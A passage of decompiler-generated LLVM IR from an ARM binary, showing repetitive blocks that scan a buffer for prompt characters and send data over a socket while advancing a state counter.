  %v1_13234 = add i32 %v0_13234, 1
  store i32 %v1_13234, i32* @r7, align 4
  %v2_13238 = icmp eq i32 %v1_13234, -1
  store i1 %v2_13238, i1* %cpsr_c.global-to-local, align 1
  %v7_13238 = icmp eq i32 %v0_13234, -2
  store i1 %v7_13238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13238, label %dec_label_pc_13008, label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %dec_label_pc_13234, %dec_label_pc_13028, %dec_label_pc_13008
  %v0_13240 = phi i32 [ %v5_13038, %dec_label_pc_13028 ], [ %v5_13018, %dec_label_pc_13008 ], [ %v1_13234, %dec_label_pc_13234 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13240 = icmp eq i32 %v0_13240, 0
  store i1 %v2_13240, i1* %cpsr_z.global-to-local, align 1
  %tmp323 = icmp slt i32 %v0_13240, 1
  br i1 %tmp323, label %dec_label_pc_131dc, label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13240
  %v0_13248 = load i32, i32* @r5, align 4
  %v1_13248 = inttoptr i32 %v0_13248 to i32*
  %v2_13248 = load i32, i32* %v1_13248, align 4
  store i32 %v2_13248, i32* %r3.global-to-local, align 4
  %v1_1324c = add i32 %v0_13248, 4
  %v2_1324c = inttoptr i32 %v1_1324c to i32*
  %v3_1324c = load i32, i32* %v2_1324c, align 4
  store i32 %v3_1324c, i32* %r0.global-to-local, align 4
  %v1_13250 = add i32 %v2_13248, 12
  %v2_13250 = inttoptr i32 %v1_13250 to i8*
  %v3_13250 = load i8, i8* %v2_13250, align 1
  %v4_13250 = zext i8 %v3_13250 to i32
  store i32 %v4_13250, i32* %r2.global-to-local, align 4
  %v1_13254 = inttoptr i32 %v2_13248 to i32*
  %v2_13254 = load i32, i32* %v1_13254, align 4
  store i32 %v2_13254, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1325c = call i32 @_send(i32 %v3_1324c, i32 %v2_13254, i32 %v4_13250, i32 16384)
  store i32 %v4_1325c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_13264 = load i32, i32* @r5, align 4
  %v1_13264 = add i32 %v0_13264, 4
  %v2_13264 = inttoptr i32 %v1_13264 to i32*
  %v3_13264 = load i32, i32* %v2_13264, align 4
  store i32 %v3_13264, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_13270 = call i32 @_send(i32 %v3_13264, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 %v4_13270, i32* %r0.global-to-local, align 4
  %v0_13274 = load i32, i32* @r5, align 4
  %v1_13274 = add i32 %v0_13274, 24
  %v2_13274 = inttoptr i32 %v1_13274 to i32*
  %v3_13274 = load i32, i32* %v2_13274, align 4
  store i32 %v3_13274, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1327c = add i32 %v0_13274, 12
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  store i32 4, i32* %v3_1327c, align 4
  br label %dec_label_pc_13818

dec_label_pc_13384:                               ; preds = %dec_label_pc_130cc
  %v1_13384 = add i32 %v0_130cc, 24
  %v2_13384 = inttoptr i32 %v1_13384 to i32*
  %v3_13384 = load i32, i32* %v2_13384, align 4
  store i32 %v3_13384, i32* %ip.global-to-local, align 4
  %v1_13388 = add i32 %v3_13384, -1
  store i32 %v1_13388, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1338c = icmp eq i32 %v1_13388, 0
  store i1 %v2_1338c, i1* %cpsr_z.global-to-local, align 1
  %v5_13390 = icmp sgt i32 %v1_13388, 0
  br i1 %v5_13390, label %dec_label_pc_133b0, label %dec_label_pc_139f8

dec_label_pc_13398:                               ; preds = %bb324
  %v2_13398 = icmp ugt i8 %v3_133b4, 35
  store i1 %v2_13398, i1* %cpsr_c.global-to-local, align 1
  %v7_13398 = icmp eq i8 %v3_133b4, 36
  store i1 %v7_13398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13398, label %dec_label_pc_133c4, label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13398
  %v2_133a0 = icmp ugt i8 %v3_133b4, 34
  store i1 %v2_133a0, i1* %cpsr_c.global-to-local, align 1
  %v7_133a0 = icmp eq i8 %v3_133b4, 35
  store i1 %v7_133a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133a0, label %dec_label_pc_133c4, label %dec_label_pc_133a8

dec_label_pc_133a8:                               ; preds = %dec_label_pc_133a0
  %v1_133a8 = add i32 %v0_133c4, -1
  store i32 %v1_133a8, i32* %r0.global-to-local, align 4
  %v2_133a8 = icmp ne i32 %v0_133c4, 0
  store i1 %v2_133a8, i1* %cpsr_c.global-to-local, align 1
  %v7_133a8 = icmp eq i32 %v0_133c4, 1
  store i1 %v7_133a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133a8, label %dec_label_pc_139f8, label %dec_label_pc_133b0

dec_label_pc_133b0:                               ; preds = %dec_label_pc_13384, %dec_label_pc_133a8
  %v0_133c4 = phi i32 [ %v1_133a8, %dec_label_pc_133a8 ], [ %v1_13388, %dec_label_pc_13384 ]
  %v2_133b0 = add i32 %v0_133c4, %v0_130cc
  store i32 %v2_133b0, i32* %r3.global-to-local, align 4
  %v1_133b4 = add i32 %v2_133b0, 28
  %v2_133b4 = inttoptr i32 %v1_133b4 to i8*
  %v3_133b4 = load i8, i8* %v2_133b4, align 1
  %v4_133b4 = zext i8 %v3_133b4 to i32
  store i32 %v4_133b4, i32* %r3.global-to-local, align 4
  %v2_133b8 = icmp ugt i8 %v3_133b4, 61
  store i1 %v2_133b8, i1* %cpsr_c.global-to-local, align 1
  %v7_133b8 = icmp eq i8 %v3_133b4, 62
  store i1 %v7_133b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133b8, label %dec_label_pc_133c4, label %bb324

bb324:                                            ; preds = %dec_label_pc_133b0
  %v3_133bc = icmp ugt i8 %v3_133b4, 57
  store i1 %v3_133bc, i1* %cpsr_c.global-to-local, align 1
  %v8_133bc = icmp eq i8 %v3_133b4, 58
  store i1 %v8_133bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_133bc, label %dec_label_pc_133c4, label %dec_label_pc_13398

dec_label_pc_133c4:                               ; preds = %dec_label_pc_133b0, %bb324, %dec_label_pc_133a0, %dec_label_pc_13398
  %v1_133c4 = add i32 %v0_133c4, 1
  store i32 %v1_133c4, i32* @r7, align 4
  %v2_133c8 = icmp eq i32 %v1_133c4, -1
  store i1 %v2_133c8, i1* %cpsr_c.global-to-local, align 1
  %v7_133c8 = icmp eq i32 %v0_133c4, -2
  store i1 %v7_133c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133c8, label %dec_label_pc_139f8, label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_133c4, %dec_label_pc_139f8
  %v0_133d0 = phi i32 [ %v5_13a08, %dec_label_pc_139f8 ], [ %v1_133c4, %dec_label_pc_133c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_133d0 = icmp eq i32 %v0_133d0, 0
  store i1 %v2_133d0, i1* %cpsr_z.global-to-local, align 1
  %tmp325 = icmp slt i32 %v0_133d0, 1
  br i1 %tmp325, label %dec_label_pc_131dc, label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133d0
  %v0_133d8 = load i32, i32* @r5, align 4
  %v1_133d8 = inttoptr i32 %v0_133d8 to i32*
  %v2_133d8 = load i32, i32* %v1_133d8, align 4
  store i32 %v2_133d8, i32* %r3.global-to-local, align 4
  %v1_133dc = add i32 %v0_133d8, 4
  %v2_133dc = inttoptr i32 %v1_133dc to i32*
  %v3_133dc = load i32, i32* %v2_133dc, align 4
  store i32 %v3_133dc, i32* %r0.global-to-local, align 4
  %v1_133e0 = add i32 %v2_133d8, 13
  %v2_133e0 = inttoptr i32 %v1_133e0 to i8*
  %v3_133e0 = load i8, i8* %v2_133e0, align 1
  %v4_133e0 = zext i8 %v3_133e0 to i32
  store i32 %v4_133e0, i32* %r2.global-to-local, align 4
  %v1_133e4 = add i32 %v2_133d8, 4
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  %v3_133e4 = load i32, i32* %v2_133e4, align 4
  store i32 %v3_133e4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_133ec = call i32 @_send(i32 %v3_133dc, i32 %v3_133e4, i32 %v4_133e0, i32 16384)
  store i32 %v4_133ec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_133f4 = load i32, i32* @r5, align 4
  %v1_133f4 = add i32 %v0_133f4, 4
  %v2_133f4 = inttoptr i32 %v1_133f4 to i32*
  %v3_133f4 = load i32, i32* %v2_133f4, align 4
  store i32 %v3_133f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_13400 = call i32 @_send(i32 %v3_133f4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 %v4_13400, i32* %r0.global-to-local, align 4
  %v0_13404 = load i32, i32* @r5, align 4
  %v1_13404 = add i32 %v0_13404, 24
  %v2_13404 = inttoptr i32 %v1_13404 to i32*
  %v3_13404 = load i32, i32* %v2_13404, align 4
  store i32 %v3_13404, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_1340c = add i32 %v0_13404, 12
  %v3_1340c = inttoptr i32 %v2_1340c to i32*
  store i32 5, i32* %v3_1340c, align 4
  br label %dec_label_pc_13818

dec_label_pc_13414:                               ; preds = %dec_label_pc_130cc
  %v1_13414 = add i32 %v0_130cc, 24
  %v2_13414 = inttoptr i32 %v1_13414 to i32*
  %v3_13414 = load i32, i32* %v2_13414, align 4
  store i32 %v3_13414, i32* %ip.global-to-local, align 4
  %v1_13418 = add i32 %v3_13414, -1
  store i32 %v1_13418, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1341c = icmp eq i32 %v1_13418, 0
  store i1 %v2_1341c, i1* %cpsr_z.global-to-local, align 1
  %v5_13420 = icmp sgt i32 %v1_13418, 0
  br i1 %v5_13420, label %dec_label_pc_13448, label %dec_label_pc_1304cthread-pre-split.thread

dec_label_pc_13428:                               ; preds = %bb326
  %v2_13428 = icmp ugt i8 %v3_1344c, 35
  store i1 %v2_13428, i1* %cpsr_c.global-to-local, align 1
  %v7_13428 = icmp eq i8 %v3_1344c, 36
  store i1 %v7_13428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13428, label %dec_label_pc_1345c, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13428
  %v2_13430 = icmp ugt i8 %v3_1344c, 34
  store i1 %v2_13430, i1* %cpsr_c.global-to-local, align 1
  %v7_13430 = icmp eq i8 %v3_1344c, 35
  store i1 %v7_13430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13430, label %dec_label_pc_1345c, label %dec_label_pc_13438

dec_label_pc_13438:                               ; preds = %dec_label_pc_13430
  %v2_13438 = icmp ugt i8 %v3_1344c, 36
  store i1 %v2_13438, i1* %cpsr_c.global-to-local, align 1
  %v7_13438 = icmp eq i8 %v3_1344c, 37
  store i1 %v7_13438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13438, label %dec_label_pc_1345c, label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %dec_label_pc_13438
  %v1_13440 = add i32 %v0_1345c, -1
  store i32 %v1_13440, i32* %r0.global-to-local, align 4
  %v2_13440 = icmp ne i32 %v0_1345c, 0
  store i1 %v2_13440, i1* %cpsr_c.global-to-local, align 1
  %v7_13440 = icmp eq i32 %v0_1345c, 1
  store i1 %v7_13440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13440, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13448

dec_label_pc_13448:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13440
  %v0_1345c = phi i32 [ %v1_13440, %dec_label_pc_13440 ], [ %v1_13418, %dec_label_pc_13414 ]
  %v2_13448 = add i32 %v0_1345c, %v0_130cc
  store i32 %v2_13448, i32* %r3.global-to-local, align 4
  %v1_1344c = add i32 %v2_13448, 28
  %v2_1344c = inttoptr i32 %v1_1344c to i8*
  %v3_1344c = load i8, i8* %v2_1344c, align 1
  %v4_1344c = zext i8 %v3_1344c to i32
  store i32 %v4_1344c, i32* %r3.global-to-local, align 4
  %v2_13450 = icmp ugt i8 %v3_1344c, 61
  store i1 %v2_13450, i1* %cpsr_c.global-to-local, align 1
  %v7_13450 = icmp eq i8 %v3_1344c, 62
  store i1 %v7_13450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13450, label %dec_label_pc_1345c, label %bb326

bb326:                                            ; preds = %dec_label_pc_13448
  %v3_13454 = icmp ugt i8 %v3_1344c, 57
  store i1 %v3_13454, i1* %cpsr_c.global-to-local, align 1
  %v8_13454 = icmp eq i8 %v3_1344c, 58
  store i1 %v8_13454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13454, label %dec_label_pc_1345c, label %dec_label_pc_13428

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13448, %bb326, %dec_label_pc_13438, %dec_label_pc_13430, %dec_label_pc_13428
  %v1_1345c = add i32 %v0_1345c, 1
  store i32 %v1_1345c, i32* @r7, align 4
  %v2_13460 = icmp eq i32 %v1_1345c, -1
  store i1 %v2_13460, i1* %cpsr_c.global-to-local, align 1
  %v7_13460 = icmp eq i32 %v0_1345c, -2
  store i1 %v7_13460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13460, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_13468

dec_label_pc_13468:                               ; preds = %dec_label_pc_1345c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13468 = icmp eq i32 %v1_1345c, 0
  store i1 %v2_13468, i1* %cpsr_z.global-to-local, align 1
  %tmp327 = icmp slt i32 %v1_1345c, 1
  br i1 %tmp327, label %dec_label_pc_131dc, label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13468
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_13474 = call i32 @function_13ce8(i32 21)
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_13484 = call i32 @function_13c04(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_13484, i32* %r0.global-to-local, align 4
  %v3_13488 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_13488, i32* %r2.global-to-local, align 4
  store i32 %v3_13484, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13494 = load i32, i32* @r5, align 4
  %v1_13494 = add i32 %v0_13494, 4
  %v2_13494 = inttoptr i32 %v1_13494 to i32*
  %v3_13494 = load i32, i32* %v2_13494, align 4
  store i32 %v3_13494, i32* %r0.global-to-local, align 4
  %v4_13498 = call i32 @_send(i32 %v3_13494, i32 %v3_13484, i32 %v3_13488, i32 16384)
  store i32 %v4_13498, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_134a8 = load i32, i32* @r5, align 4
  %v1_134a8 = add i32 %v0_134a8, 4
  %v2_134a8 = inttoptr i32 %v1_134a8 to i32*
  %v3_134a8 = load i32, i32* %v2_134a8, align 4
  store i32 %v3_134a8, i32* %r0.global-to-local, align 4
  %v4_134ac = call i32 @_send(i32 %v3_134a8, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_134b4 = call i32 @function_13c30(i32 21)
  store i32 %v1_134b4, i32* %r0.global-to-local, align 4
  %v0_134b8 = load i32, i32* @r5, align 4
  %v1_134b8 = add i32 %v0_134b8, 24
  %v2_134b8 = inttoptr i32 %v1_134b8 to i32*
  %v3_134b8 = load i32, i32* %v2_134b8, align 4
  store i32 %v3_134b8, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_134c0 = add i32 %v0_134b8, 12
  %v3_134c0 = inttoptr i32 %v2_134c0 to i32*
  store i32 6, i32* %v3_134c0, align 4
  br label %dec_label_pc_13818

dec_label_pc_134c8:                               ; preds = %dec_label_pc_130cc
  %v1_134c8 = add i32 %v0_130cc, 24
  %v2_134c8 = inttoptr i32 %v1_134c8 to i32*
  %v3_134c8 = load i32, i32* %v2_134c8, align 4
  store i32 %v3_134c8, i32* %ip.global-to-local, align 4
  %v1_134cc = add i32 %v3_134c8, -1
  store i32 %v1_134cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_134d0 = icmp eq i32 %v1_134cc, 0
  store i1 %v2_134d0, i1* %cpsr_z.global-to-local, align 1
  %v5_134d4 = icmp sgt i32 %v1_134cc, 0
  br i1 %v5_134d4, label %dec_label_pc_134fc, label %dec_label_pc_1304cthread-pre-split.thread

dec_label_pc_134dc:                               ; preds = %bb328
  %v2_134dc = icmp ugt i8 %v3_13500, 35
  store i1 %v2_134dc, i1* %cpsr_c.global-to-local, align 1
  %v7_134dc = icmp eq i8 %v3_13500, 36
  store i1 %v7_134dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_134dc, label %dec_label_pc_13510, label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134dc
  %v2_134e4 = icmp ugt i8 %v3_13500, 34
  store i1 %v2_134e4, i1* %cpsr_c.global-to-local, align 1
  %v7_134e4 = icmp eq i8 %v3_13500, 35
  store i1 %v7_134e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_134e4, label %dec_label_pc_13510, label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134e4
  %v2_134ec = icmp ugt i8 %v3_13500, 36
  store i1 %v2_134ec, i1* %cpsr_c.global-to-local, align 1
  %v7_134ec = icmp eq i8 %v3_13500, 37
  store i1 %v7_134ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_134ec, label %dec_label_pc_13510, label %dec_label_pc_134f4

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134ec
  %v1_134f4 = add i32 %v0_13510, -1
  store i32 %v1_134f4, i32* %r0.global-to-local, align 4
  %v2_134f4 = icmp ne i32 %v0_13510, 0
  store i1 %v2_134f4, i1* %cpsr_c.global-to-local, align 1
  %v7_134f4 = icmp eq i32 %v0_13510, 1
  store i1 %v7_134f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_134f4, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_134fc

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134c8, %dec_label_pc_134f4
  %v0_13510 = phi i32 [ %v1_134f4, %dec_label_pc_134f4 ], [ %v1_134cc, %dec_label_pc_134c8 ]
  %v2_134fc = add i32 %v0_13510, %v0_130cc
  store i32 %v2_134fc, i32* %r3.global-to-local, align 4
  %v1_13500 = add i32 %v2_134fc, 28
  %v2_13500 = inttoptr i32 %v1_13500 to i8*
  %v3_13500 = load i8, i8* %v2_13500, align 1
  %v4_13500 = zext i8 %v3_13500 to i32
  store i32 %v4_13500, i32* %r3.global-to-local, align 4
  %v2_13504 = icmp ugt i8 %v3_13500, 61
  store i1 %v2_13504, i1* %cpsr_c.global-to-local, align 1
  %v7_13504 = icmp eq i8 %v3_13500, 62
  store i1 %v7_13504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13504, label %dec_label_pc_13510, label %bb328

bb328:                                            ; preds = %dec_label_pc_134fc
  %v3_13508 = icmp ugt i8 %v3_13500, 57
  store i1 %v3_13508, i1* %cpsr_c.global-to-local, align 1
  %v8_13508 = icmp eq i8 %v3_13500, 58
  store i1 %v8_13508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13508, label %dec_label_pc_13510, label %dec_label_pc_134dc

dec_label_pc_13510:                               ; preds = %dec_label_pc_134fc, %bb328, %dec_label_pc_134ec, %dec_label_pc_134e4, %dec_label_pc_134dc
  %v1_13510 = add i32 %v0_13510, 1
  store i32 %v1_13510, i32* @r7, align 4
  %v2_13514 = icmp eq i32 %v1_13510, -1
  store i1 %v2_13514, i1* %cpsr_c.global-to-local, align 1
  %v7_13514 = icmp eq i32 %v0_13510, -2
  store i1 %v7_13514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13514, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_1351c

dec_label_pc_1351c:                               ; preds = %dec_label_pc_13510
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1351c = icmp eq i32 %v1_13510, 0
  store i1 %v2_1351c, i1* %cpsr_z.global-to-local, align 1
  %tmp329 = icmp slt i32 %v1_13510, 1
  br i1 %tmp329, label %dec_label_pc_131dc, label %dec_label_pc_13524

dec_label_pc_13524:                               ; preds = %dec_label_pc_1351c
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_13528 = call i32 @function_13ce8(i32 22)
  store i32 %v2_13530, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_13538 = call i32 @function_13c04(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_13538, i32* %r0.global-to-local, align 4
  %v3_1353c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1353c, i32* %r2.global-to-local, align 4
  store i32 %v3_13538, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13548 = load i32, i32* @r5, align 4
  %v1_13548 = add i32 %v0_13548, 4
  %v2_13548 = inttoptr i32 %v1_13548 to i32*
  %v3_13548 = load i32, i32* %v2_13548, align 4
  store i32 %v3_13548, i32* %r0.global-to-local, align 4
  %v4_1354c = call i32 @_send(i32 %v3_13548, i32 %v3_13538, i32 %v3_1353c, i32 16384)
  store i32 %v4_1354c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1355c = load i32, i32* @r5, align 4
  %v1_1355c = add i32 %v0_1355c, 4
  %v2_1355c = inttoptr i32 %v1_1355c to i32*
  %v3_1355c = load i32, i32* %v2_1355c, align 4
  store i32 %v3_1355c, i32* %r0.global-to-local, align 4
  %v4_13560 = call i32 @_send(i32 %v3_1355c, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_13568 = call i32 @function_13c30(i32 22)
  store i32 %v1_13568, i32* %r0.global-to-local, align 4
  %v0_1356c = load i32, i32* @r5, align 4
  %v1_1356c = add i32 %v0_1356c, 24
  %v2_1356c = inttoptr i32 %v1_1356c to i32*
  %v3_1356c = load i32, i32* %v2_1356c, align 4
  store i32 %v3_1356c, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_13574 = add i32 %v0_1356c, 12
  %v3_13574 = inttoptr i32 %v2_13574 to i32*
  store i32 7, i32* %v3_13574, align 4
  br label %dec_label_pc_13818

dec_label_pc_1357c:                               ; preds = %dec_label_pc_130cc
  %v1_1357c = add i32 %v0_130cc, 24
  %v2_1357c = inttoptr i32 %v1_1357c to i32*
  %v3_1357c = load i32, i32* %v2_1357c, align 4
  store i32 %v3_1357c, i32* %ip.global-to-local, align 4
  %v1_13580 = add i32 %v3_1357c, -1
  store i32 %v1_13580, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13584 = icmp eq i32 %v1_13580, 0
  store i1 %v2_13584, i1* %cpsr_z.global-to-local, align 1
  %v5_13588 = icmp sgt i32 %v1_13580, 0
  br i1 %v5_13588, label %dec_label_pc_135b0, label %dec_label_pc_1304cthread-pre-split.thread

dec_label_pc_13590:                               ; preds = %bb330
  %v2_13590 = icmp ugt i8 %v3_135b4, 35
  store i1 %v2_13590, i1* %cpsr_c.global-to-local, align 1
  %v7_13590 = icmp eq i8 %v3_135b4, 36
  store i1 %v7_13590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13590, label %dec_label_pc_135c4, label %dec_label_pc_13598

dec_label_pc_13598:                               ; preds = %dec_label_pc_13590
  %v2_13598 = icmp ugt i8 %v3_135b4, 34
  store i1 %v2_13598, i1* %cpsr_c.global-to-local, align 1
  %v7_13598 = icmp eq i8 %v3_135b4, 35
  store i1 %v7_13598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13598, label %dec_label_pc_135c4, label %dec_label_pc_135a0

dec_label_pc_135a0:                               ; preds = %dec_label_pc_13598
  %v2_135a0 = icmp ugt i8 %v3_135b4, 36
  store i1 %v2_135a0, i1* %cpsr_c.global-to-local, align 1
  %v7_135a0 = icmp eq i8 %v3_135b4, 37
  store i1 %v7_135a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135a0, label %dec_label_pc_135c4, label %dec_label_pc_135a8

dec_label_pc_135a8:                               ; preds = %dec_label_pc_135a0
  %v1_135a8 = add i32 %v0_135c4, -1
  store i32 %v1_135a8, i32* %r0.global-to-local, align 4
  %v2_135a8 = icmp ne i32 %v0_135c4, 0
  store i1 %v2_135a8, i1* %cpsr_c.global-to-local, align 1
  %v7_135a8 = icmp eq i32 %v0_135c4, 1
  store i1 %v7_135a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135a8, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_135b0

dec_label_pc_135b0:                               ; preds = %dec_label_pc_1357c, %dec_label_pc_135a8
  %v0_135c4 = phi i32 [ %v1_135a8, %dec_label_pc_135a8 ], [ %v1_13580, %dec_label_pc_1357c ]
  %v2_135b0 = add i32 %v0_135c4, %v0_130cc
  store i32 %v2_135b0, i32* %r3.global-to-local, align 4
  %v1_135b4 = add i32 %v2_135b0, 28
  %v2_135b4 = inttoptr i32 %v1_135b4 to i8*
  %v3_135b4 = load i8, i8* %v2_135b4, align 1
  %v4_135b4 = zext i8 %v3_135b4 to i32
  store i32 %v4_135b4, i32* %r3.global-to-local, align 4
  %v2_135b8 = icmp ugt i8 %v3_135b4, 61
  store i1 %v2_135b8, i1* %cpsr_c.global-to-local, align 1
  %v7_135b8 = icmp eq i8 %v3_135b4, 62
  store i1 %v7_135b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135b8, label %dec_label_pc_135c4, label %bb330

bb330:                                            ; preds = %dec_label_pc_135b0
  %v3_135bc = icmp ugt i8 %v3_135b4, 57
  store i1 %v3_135bc, i1* %cpsr_c.global-to-local, align 1
  %v8_135bc = icmp eq i8 %v3_135b4, 58
  store i1 %v8_135bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_135bc, label %dec_label_pc_135c4, label %dec_label_pc_13590

dec_label_pc_135c4:                               ; preds = %dec_label_pc_135b0, %bb330, %dec_label_pc_135a0, %dec_label_pc_13598, %dec_label_pc_13590
  %v1_135c4 = add i32 %v0_135c4, 1
  store i32 %v1_135c4, i32* @r7, align 4
  %v2_135c8 = icmp eq i32 %v1_135c4, -1
  store i1 %v2_135c8, i1* %cpsr_c.global-to-local, align 1
  %v7_135c8 = icmp eq i32 %v0_135c4, -2
  store i1 %v7_135c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135c8, label %dec_label_pc_1304cthread-pre-split, label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_135d0 = icmp eq i32 %v1_135c4, 0
  store i1 %v2_135d0, i1* %cpsr_z.global-to-local, align 1
  %tmp331 = icmp slt i32 %v1_135c4, 1
  br i1 %tmp331, label %dec_label_pc_131dc, label %dec_label_pc_135d8

dec_label_pc_135d8:                               ; preds = %dec_label_pc_135d0
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_135dc = call i32 @function_13ce8(i32 23)
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_135ec = call i32 @function_13c04(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_135ec, i32* %r0.global-to-local, align 4
  %v3_135f0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_135f0, i32* %r2.global-to-local, align 4
  store i32 %v3_135ec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_135fc = load i32, i32* @r5, align 4
  %v1_135fc = add i32 %v0_135fc, 4
  %v2_135fc = inttoptr i32 %v1_135fc to i32*
  %v3_135fc = load i32, i32* %v2_135fc, align 4
  store i32 %v3_135fc, i32* %r0.global-to-local, align 4
  %v4_13600 = call i32 @_send(i32 %v3_135fc, i32 %v3_135ec, i32 %v3_135f0, i32 16384)
  store i32 %v4_13600, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
